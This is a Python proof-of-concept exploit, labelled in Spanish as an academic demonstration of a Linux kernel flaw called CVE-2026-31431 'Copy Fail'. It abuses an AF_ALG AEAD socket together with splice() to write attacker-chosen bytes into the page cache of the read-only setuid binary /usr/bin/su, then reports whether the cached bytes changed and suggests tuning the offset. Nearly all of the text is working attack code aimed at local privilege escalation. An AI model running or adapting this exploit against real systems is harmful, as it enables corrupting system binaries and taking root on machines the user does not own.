import os, socket, struct, sys, ctypes

AF_ALG=38; SOL_ALG=279; ALG_SET_KEY=1; ALG_SET_IV=2; ALG_SET_OP=3
ALG_SET_AEAD_AUTHSIZE=5; ALG_OP_DECRYPT=0
TARGET="/usr/bin/su"; AUTHSIZE=16
libc=ctypes.CDLL("libc.so.6",use_errno=True)

def setup_afalg():
    tf=socket.socket(AF_ALG,socket.SOCK_SEQPACKET,0)
    tf.bind(("aead","authencesn(hmac(sha256),cbc(aes))",0,0))
    ret=libc.setsockopt(tf.fileno(),SOL_ALG,ALG_SET_AEAD_AUTHSIZE,None,AUTHSIZE)
    if ret!=0:
        err=ctypes.get_errno(); raise OSError(err,os.strerror(err))
    enc_key=bytes(16); auth_key=bytes(32)
    rta=struct.pack("=HH",8,1)+struct.pack(">I",len(enc_key))
    tf.setsockopt(SOL_ALG,ALG_SET_KEY,rta+enc_key+auth_key)
    op,_=tf.accept()
    return tf,op

def main():
    print("="*55)
    print("CVE-2026-31431 Copy Fail - Demostración académica")
    print("="*55)
    uid=os.getuid()
    print(f"\n[*] uid actual : {uid}")
    antes=open(TARGET,"rb").read(16)
    print(f"[*] bytes disco (antes) : {antes.hex()}")
    fd=os.open(TARGET,os.O_RDONLY)
    print("\n[*] Abriendo AF_ALG socket...")
    tf,op=setup_afalg()
    print("[*] Socket listo")
    pr,pw=os.pipe()
    WRITE_VALUE=0xDEADBEEF; ASSOCLEN=16; SPLICE_LEN=ASSOCLEN+AUTHSIZE
    aad=b'\x00'*4+struct.pack(">I",WRITE_VALUE)+b'\x00'*8
    iv=bytes(16); iv_cmsg=struct.pack("I",len(iv))+iv
    print(f"[*] Valor a escribir : 0x{WRITE_VALUE:08x}")
    n1=os.splice(fd,pw,SPLICE_LEN)
    print(f"[*] splice(file->pipe) : {n1} bytes")
    op.sendmsg([aad],[(SOL_ALG,ALG_SET_IV,iv_cmsg),(SOL_ALG,ALG_SET_OP,struct.pack("I",ALG_OP_DECRYPT))],socket.MSG_MORE)
    n2=os.splice(pr,op.fileno(),SPLICE_LEN)
    print(f"[*] splice(pipe->AEAD) : {n2} bytes")
    print("[*] recv() -> scratch write...")
    try:
        op.recv(4096)
    except OSError as e:
        print(f"[*] Error esperado (HMAC invalido): {e.strerror}")
        print("[!] La escritura ocurrio ANTES de que fallara el HMAC")
    os.lseek(fd,0,os.SEEK_SET)
    despues=os.read(fd,16)
    print(f"\n[*] bytes page cache (despues): {despues.hex()}")
    if antes!=despues:
        print(f"\n[!!!] PAGE CACHE CORROMPIDO:")
        print(f"      Antes : {antes.hex()}")
        print(f"      Ahora : {despues.hex()}")
    else:
        print("\n[*] Write cayo fuera de los primeros 16 bytes")
        print("    La primitiva funciona - ajusta el offset exacto")
    os.close(pr);os.close(pw);os.close(fd);op.close();tf.close()
    print("\n[*] Ver crypto/algif_aead.c linea 282.")

if __name__=="__main__":
    main()
